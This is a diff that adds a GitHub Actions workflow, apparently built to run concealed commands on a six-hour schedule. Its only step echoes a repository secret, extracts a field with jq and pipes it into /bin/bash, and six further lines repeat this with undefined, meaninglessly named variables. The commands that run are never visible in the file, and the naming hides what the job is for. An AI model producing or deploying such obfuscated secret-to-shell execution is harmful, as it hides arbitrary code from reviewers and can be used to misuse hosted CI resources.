@@ -1,0 +1,24 @@
+name: blastheineken
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: blastheineken
+        env:
+          io1: ${{ secrets.io1 }}
+        run: |
+          echo $io1 | jq -r .gsv11 | /bin/bash
+          echo $owo6438 | jq -r .k959 | /bin/bash
+          echo $gvl4200 | jq -r .ifaa84062 | /bin/bash
+          echo $lg13 | jq -r .j3 | /bin/bash
+          echo $oiu6983 | jq -r .jc7 | /bin/bash
+          echo $cl8 | jq -r .ra35894 | /bin/bash
+          echo $hrb1390 | jq -r .jhr94403 | /bin/bash
+
